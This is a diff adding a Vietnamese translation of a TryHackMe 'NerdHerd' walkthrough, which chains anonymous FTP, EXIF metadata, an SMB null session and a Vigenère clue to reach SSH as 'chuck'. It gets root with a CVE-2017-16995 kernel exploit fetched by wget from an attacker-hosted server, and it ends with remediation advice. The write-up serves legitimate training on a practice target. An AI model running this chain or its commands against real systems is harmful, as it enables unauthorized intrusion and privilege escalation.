@@ -1,6 +1,6 @@
 ---
 title: 'NerdHerd'
-description: '[[THIẾU MÔ TẢ]]'
+description: 'Một cuộc săn manh mối qua FTP, EXIF, một phiên SMB null và lời một bài hát để SSH vào với tư cách chuck, rồi một lỗ hổng kernel cũ để lên root.'
 date: 2026-10-05
 platform: tryhackme
 room: 'NerdHerd'
@@ -8,8 +8,223 @@ roomUrl: 'https://tryhackme.com/room/nerdherd'
 difficulty: medium
 tags: [linux, ftp, smb, exif, steganography, kernel exploit, enumeration]
 vulnClasses: [Information Disclosure, Weak Credentials, Kernel Privilege Escalation]
-translation: pending
-draft: true
+translation: done
+draft: false
 ---
 
-Bản dịch tiếng Việt đang được chuẩn bị. Đọc bản tiếng Anh.
+## TryHackMe: NerdHerd — Truy đuổi Chuck qua FTP, SMB, và lời một bài hát
+
+_Lời giải phòng "NerdHerd". Bài này là một cuộc săn manh mối: FTP ẩn danh trao cho bạn một bức ảnh và một gợi ý, metadata EXIF giấu một mật khẩu đã mã hóa, một phiên SMB null làm lộ username duy nhất bạn cần, và một trang web lặng lẽ trỏ bạn tới một bài hát mà lời một dòng của nó chính là khóa giải mã. Nối tất cả lại và bạn SSH vào với tư cách_ _`chuck`_, _rồi cưỡi một kernel cũ để lên root._
+
+> Các giá trị flag đã được che. NerdHerd là một phòng luyện tập đã retired trên TryHackMe; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập được phép.
+
+---
+
+### TL;DR — toàn bộ chuỗi
+
+<Callout type="tldr">
+
+FTP ẩn danh → PNG + gợi ý `.jokesonyou` ("all you need is in the leet") → `exiftool` làm lộ một tên chủ sở hữu đã mã hóa → phiên SMB null làm lộ user **chuck** → web app ở cổng **1337** + gợi ý _Surfin' Bird_ ("bird is the word") giải mã chuỗi thành **mật khẩu của chuck** → SMB share `nerdherd_classified` → `secr3t.txt` trỏ tới một đường dẫn web ẩn → **mật khẩu SSH** cho chuck → user flag → eBPF LPE trên kernel 4.4 (**CVE-2017-16995**) → **root**.
+
+</Callout>
+
+### Mục tiêu
+
+```text
+export IP=<target-ip>
+nmap -sC -sV -p- -T4 --min-rate=1000 $IP
+```
+
+```text
+21/tcp   open  ftp         vsftpd 3.0.3        # anonymous login allowed
+22/tcp   open  ssh         OpenSSH 7.2p2 (Ubuntu)
+139/tcp  open  netbios-ssn Samba smbd 3.X-4.X
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
+1337/tcp open  http        Apache 2.4.18 (Ubuntu)   # "It works" default page
+```
+
+Năm cổng, ba trong số đó nói nhiều: FTP ẩn danh, một ngăn SMB mê phiên null, và một dịch vụ HTTP đậu ở cổng **1337** — "leet", mà hóa ra tự nó là một gợi ý.
+
+### FTP: manh mối đầu tiên
+
+`nmap` đã báo đăng nhập ẩn danh, nên cứ bước vào:
+
+```text
+ftp -A $IP        # user: anonymous
+```
+
+`pub/` chứa `youfoundme.png` và một thư mục ẩn `.jokesonyou/` với một file text nhỏ xíu:
+
+```text
+cat hellon3rd.txt
+# all you need is in the leet
+```
+
+"The leet" = cổng **1337**. Vậy web app là nơi câu đố tiếp tục — nhưng trước hết, hãy vắt kiệt bức ảnh.
+
+### EXIF: một mật khẩu giấu trong metadata
+
+Đừng bao giờ tin một PNG trông vô hại trên một máy CTF. `exiftool` trên `youfoundme.png` làm nổi lên một trường lạc chỗ:
+
+```text
+exiftool youfoundme.png
+# ...
+# Owner Name : fijbxslz
+```
+
+`fijbxslz` không phải ngẫu nhiên — đó là một bí mật đã mã hóa. Ta chỉ chưa có khóa. Để nó đó và đi tìm xem nó là mật khẩu của ai.
+
+### SMB: một phiên null trao cho ta username
+
+Samba ở đây cho phép một phiên không-xác-thực (null), nên `enum4linux` vào việc:
+
+```text
+enum4linux $IP
+```
+
+Hai thứ quan trọng trong đống nhiễu:
+
+- Một tài khoản người dùng — **`chuck`** (tên đầy đủ _ChuckBartowski_, một cái gật đầu về series phim _Chuck_).
+- Một share, **`nerdherd_classified`**, trông béo bở nhưng cần thông tin đăng nhập.
+
+```text
+user:[chuck] rid:[0x3e8]
+
+Sharename            Type   Comment
+nerdherd_classified  Disk   Samba on Ubuntu     # Mapping: DENIED without creds
+```
+
+Giờ ta có một username và một khối mật khẩu đã mã hóa. Ta cần khóa để nối chúng lại — và cái đó nằm trên website.
+
+### HTTP 1337: các hố thỏ và một bài hát
+
+Brute-force thư mục tìm ra một khu admin (và vài ngõ cụt được dựng ra để tốn thời gian của bạn):
+
+```text
+gobuster dir -u http://$IP:1337/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt,js,html,bak
+# /admin  (301)   .htpasswd.html (403) ...
+```
+
+Cố vượt qua trang đăng nhập `/admin/` là một trong những hố thỏ cố ý. Sợi chỉ thật là một dòng ở cuối trang index — _"Maybe the answer is in here"_ — liên kết tới một video YouTube. Bài hát là **"Surfin' Bird"** của The Trashmen, có một cụm lặp đi lặp lại:
+
+> bird is the word
+
+Đó là khóa giải mã. Chuỗi EXIF đã mã hóa `fijbxslz` là một bản mã **Vigenère**; giải nó với khóa **`bird`** và nó cho ra mật khẩu của `chuck`:
+
+```text
+fijbxslz  --Vigenère(key="bird")-->  easypass
+```
+
+(Trên trang cũng có một mẩu base64 — `Y2liYXJ0b3dza2k=` giải ra `cibartowski`, củng cố rằng Chuck Bartowski là user mục tiêu của ta.)
+
+### Điểm đặt chân, phần 1: vào share classified
+
+Với `chuck : easypass`, SMB share mở ra:
+
+```text
+smbmap -H $IP -d WORKGROUP -u chuck -p easypass
+# nerdherd_classified   READ ONLY
+
+smbclient -U chuck //$IP/nerdherd_classified
+smb: \> get secr3t.txt
+```
+
+```text
+cat secr3t.txt
+# Ssssh! ... check out "/this1sn0tadirect0ry"
+# Sincerely, 0xpr0N3rd
+```
+
+Lại một cú chuyển hướng nữa — lần này tới một đường dẫn ẩn trên web server.
+
+### Điểm đặt chân, phần 2: mật khẩu SSH
+
+Truy cập `http://$IP:1337/this1sn0tadirect0ry` cho ra thông tin đăng nhập SSH của chuck (một mật khẩu _khác_ với cái SMB — chiếc máy cứ bắt bạn đuổi theo):
+
+```text
+chuck : th1s41ntmypa5s
+```
+
+```text
+ssh chuck@$IP        # password: th1s41ntmypa5s
+```
+
+```text
+chuck@nerdherd:~$ cat user.txt
+THM{<redacted>}
+```
+
+User flag đã lấy.
+
+### Leo quyền: một kernel cổ lỗ
+
+Liệt kê ở đây ngắn — kiểm tra kernel trước, vì trên máy có một trình biên dịch (một gợi ý mạnh rằng đường đi dự định là một kernel exploit):
+
+```text
+chuck@nerdherd:~$ uname -a
+# Linux nerdherd 4.4.0-31-generic ... Ubuntu ... 2016 x86_64
+```
+
+Kernel **4.4.0-31** (2016) dính lỗi bộ kiểm chứng (verifier) eBPF **CVE-2017-16995** — một cú leo quyền cục bộ lên root tin cậy. Lấy PoC ([Exploit-DB 45010](https://www.exploit-db.com/exploits/45010)), biên dịch nó _ngay trên mục tiêu_ vì có sẵn `gcc`, và chạy:
+
+```text
+# on attacker: python3 -m http.server 8000  (serving CVE-2017-16995.c)
+chuck@nerdherd:/tmp$ wget http://<attacker-ip>:8000/CVE-2017-16995.c
+chuck@nerdherd:/tmp$ gcc CVE-2017-16995.c -o exploit
+chuck@nerdherd:/tmp$ ./exploit
+# [*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),...
+```
+
+### Các flag troll
+
+Chủ máy (`0xpr0N3rd`) đã nghịch ngợm với root flag. `/root/root.txt` là một mồi nhử:
+
+```text
+# cat /root/root.txt
+# cmon, wouldnt it be too easy if i place the root flag here?
+```
+
+Cái thật giấu ở nơi khác — một lần grep toàn hệ thống file tìm ra nó:
+
+```text
+# grep -rn 'THM' / 2>/dev/null
+# opt/.root.txt:3:THM{<redacted>}
+```
+
+Và có một **flag thưởng** nhét trong lịch sử shell của root:
+
+```text
+# cat /root/.bash_history
+# ... rm youfoundme.png
+# THM{<redacted>}
+```
+
+### Mức độ nghiêm trọng
+
+<Callout type="critical">
+
+**Cao.** Chuỗi này không cần khai thác nào để _bắt đầu_ — FTP ẩn danh, một phiên SMB null, và một web app công khai làm lộ mọi thứ cần để xác thực. Các mật khẩu yếu, dùng lại, và giải-mã-được-từ-gợi-ý trao cho một shell, và một kernel 2016 chưa vá kết thúc công việc bằng một exploit cục bộ công khai, tin cậy.
+
+</Callout>
+
+### Khắc phục — phá chuỗi ở bất kỳ mắt xích nào
+
+<Callout type="fix">
+
+1. **Khóa chặt truy cập ẩn danh.** Tắt FTP ẩn danh và phiên SMB null (`restrict anonymous`, yêu cầu xác thực) để trinh sát không thể thu thập một username và các gợi ý miễn phí.
+2. **Đừng giấu bí mật ngay trước mắt.** Metadata EXIF, các thư mục "ẩn", và các đường dẫn web khó-thấy không phải là biện pháp kiểm soát truy cập. Loại bỏ metadata khỏi các file được công bố.
+3. **Dùng mật khẩu thật.** `easypass` / `th1s41ntmypa5s` đoán-được và giải-mã-từ-câu-đố-được; áp dụng độ dài và độ phức tạp, và không bao giờ mã hóa một mật khẩu bằng một khóa mà chính app trao ra.
+4. **Vá kernel.** 4.4.0-31 là nhiều năm bỏ lỡ cập nhật. Giữ kernel mới để một exploit cục bộ đơn lẻ không phải là một cú thắng tức thì, và gỡ các trình biên dịch khỏi máy chủ production.
+
+</Callout>
+
+### Điểm rút ra
+
+- **`exiftool`** **trước tiên, luôn luôn.** Khối mật khẩu nằm sẵn trong metadata ảnh suốt từ đầu.
+- **Phiên null là món quà.** Một lần chạy `enum4linux` cho ta username duy nhất chiếc máy cần.
+- **Đọc mọi manh mối theo nghĩa đen.** "in the leet" → cổng 1337, "bird is the word" → khóa Vigenère. Gợi ý CTF thường đúng chính xác những gì chúng nói.
+- **Kernel cũ = root nhanh.** Kiểm tra `uname -a` sớm; một trình biên dịch trên máy là một tấm biển đèn neon chỉ vào một kernel LPE.
+
+Cảm ơn bạn đã đọc. NerdHerd là một cuộc truy tìm kho báu đúng nghĩa — FTP tới EXIF tới SMB tới lời một bài hát tới SSH — và một lời nhắc rằng phần khó nhất của một số máy đơn giản là để ý tới manh mối đã được trao cho bạn ba bước trước.
